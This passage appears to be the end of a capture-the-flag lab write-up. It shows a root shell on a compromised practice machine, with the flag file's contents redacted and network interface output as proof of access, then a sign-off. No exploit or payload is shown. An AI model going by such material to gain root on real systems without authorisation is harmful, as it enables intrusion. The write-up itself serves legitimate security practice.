```sh
# cat proof.txt
cat proof.txt

<snip>

<redacted>
# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:2f:84:a3 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.15/24 brd 10.0.0.255 scope global dynamic enp0s3
       valid_lft 585sec preferred_lft 585sec
    inet6 fe80::6c05:5fdd:681b:cd25/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
And with that we finished up another one.